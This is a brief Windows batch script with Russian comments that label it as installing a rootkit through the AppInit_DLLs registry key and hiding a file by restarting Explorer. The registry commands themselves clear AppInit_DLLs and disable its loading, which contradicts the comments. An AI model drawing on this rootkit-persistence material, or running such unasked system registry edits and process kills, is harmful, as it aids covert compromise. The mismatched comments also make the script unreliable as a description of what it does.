rem Добовление руткита в AppInit_DLLs и установка параметров
Reg Add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /V AppInit_DLLs /T REG_SZ /D "" /F
Reg Add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /V LoadAppInit_DLLs /T REG_DWORD /D 0 /F
Reg Add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /V RequireSignedAppInit_DLLs /T REG_DWORD /D 1 /F
rem Перезапуск експлорера (Скрытие файла)
Taskkill /f /im explorer.exe
start explorer.exe 